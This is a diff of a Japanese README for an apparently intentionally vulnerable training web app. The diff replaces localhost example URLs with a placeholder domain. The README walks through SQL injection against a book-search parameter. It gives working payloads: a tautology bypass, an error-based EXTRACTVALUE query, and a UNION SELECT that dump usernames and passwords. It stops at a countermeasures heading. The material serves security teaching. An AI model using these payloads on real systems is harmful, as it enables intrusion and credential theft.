@@ -13,15 +13,15 @@ docker-compose up
 このアプリケーションでは`search.php`の後に`?author=example`のような形で著者名による書籍データベース検索をします。
 authorのパラメータに設定された文字列をそのままチェック等一切なしでSQL文に組み込んでいるため、SQLインジェクションができてしまいます。
 
-正常な実行結果の例としては`http://127.0.0.1/search.php?author=Atabasca`を実行してみてください。
+正常な実行結果の例としては`https://<擬似ブラウザに表示されているドメイン>//search.php?author=Atabasca`を実行してみてください。
 
 ### 攻撃
 
-1. `http://127.0.0.1/search.php?author='+OR+'a'='a` というURLでauthorパラメータを設定してアクセスする。
+1. `https://<擬似ブラウザに表示されているドメイン>/search.php?author='+OR+'a'='a` というURLでauthorパラメータを設定してアクセスする。
 2. 実行された結果として、著者名に関係なく書籍データベースが取得できてしまう。
-3. `http://127.0.0.1/search.php?author='+AND+EXTRACTVALUE(0,(SELECT+CONCAT('$',username,':',password)+FROM+users+LIMIT+0,1))+%23`というURLで同様にアクセスする。
+3. `https://<擬似ブラウザに表示されているドメイン>//search.php?author='+AND+EXTRACTVALUE(0,(SELECT+CONCAT('$',username,':',password)+FROM+users+LIMIT+0,1))+%23`というURLで同様にアクセスする。
 4. 実行された結果、エラーメッセージとして`Unknown XPATH variable at: '$guest:...'`という形で、同じデータベースの別のテーブルとして入っているusername/passwordの組を取得できてしまう。
-5. `http://127.0.0.1/search.php?author='+UNION+SELECT+username,password,NULL,NULL+FROM+users--+%60`というURLで同様にアクセスする。
+5. `https://<擬似ブラウザに表示されているドメイン>//search.php?author='+UNION+SELECT+username,password,NULL,NULL+FROM+users--+%60`というURLで同様にアクセスする。
 6. 今度はテーブルの「ID」の欄にusername、「タイトル」の欄にpasswordが表示される形でテーブルusersの内容全部が取得できてしまう。
 
 ### 攻撃の対策
